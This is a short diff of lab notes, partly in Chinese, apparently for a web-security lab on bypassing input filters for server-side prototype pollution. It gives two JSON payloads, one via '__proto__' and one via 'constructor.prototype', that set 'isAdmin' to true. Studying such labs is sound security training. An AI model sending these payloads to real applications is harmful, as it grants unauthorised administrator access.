@@ -1,1 +1,11 @@
+Lab: Bypassing flawed input filters for server-side prototype pollution
+可以通过下面两种方式来添加属性到prototype
+方法一：
+"__proto__": {
+    "isAdmin":true
+}
 
+方法二:
+"constructor":{
+"prototype":{"isAdmin":true
+}}
